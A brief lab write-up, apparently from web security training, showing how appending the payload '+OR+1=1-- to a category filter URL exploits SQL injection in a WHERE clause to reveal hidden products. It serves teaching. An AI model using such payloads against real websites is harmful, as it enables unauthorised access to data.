# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Unchanged url: `https://insecure-website.com/filter?category=Lifestyle`

append `'+OR+1=1--`

This will select all products because the boolean evaluates to True.